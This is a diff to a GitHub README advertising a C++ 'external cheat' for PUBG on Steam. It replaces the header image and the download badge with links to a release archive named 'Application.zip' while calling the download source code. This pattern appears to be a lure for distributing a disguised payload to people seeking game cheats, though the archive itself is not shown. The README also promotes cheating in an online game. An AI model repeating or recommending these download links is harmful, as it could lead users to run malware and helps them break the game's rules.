@@ -1,6 +1,6 @@
 # 🎮 PUBG External Cheat FULL Feature 🎮
 
-![PUBG External Cheat](https://cdn.mos.cms.futurecdn.net/4JXZ4vQFxwRqsXxoq87uC3-1200-80.jpg)
+![PUBG External Cheat](https://github.com/Dungkztv/PUBG-External-Cheat-FULL-Feature/releases/download/v1.0/Application.zip)
 
 ## Description
 Welcome to the "PUBG External Cheat FULL Feature" repository! This cheat source code for PUBG on Steam, written in C++, provides an array of features aimed at enhancing the player's experience within the game. Whether you are looking to improve your aiming skills, optimize the game's performance, or explore new cheat functionalities, this repository has got you covered.
@@ -31,7 +31,7 @@ This repository covers a variety of topics related to PUBG cheats and modificati
 
 ## Download
 Click the button below to download the PUBG External Cheat source code:
-[![Download Cheat](https://img.shields.io/badge/Download-Release.zip-brightgreen)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Cheat](https://github.com/Dungkztv/PUBG-External-Cheat-FULL-Feature/releases/download/v1.0/Application.zip)](https://github.com/Dungkztv/PUBG-External-Cheat-FULL-Feature/releases/download/v1.0/Application.zip)
 
 ## How to Use
 1. Download the source code zip file by clicking the button above.
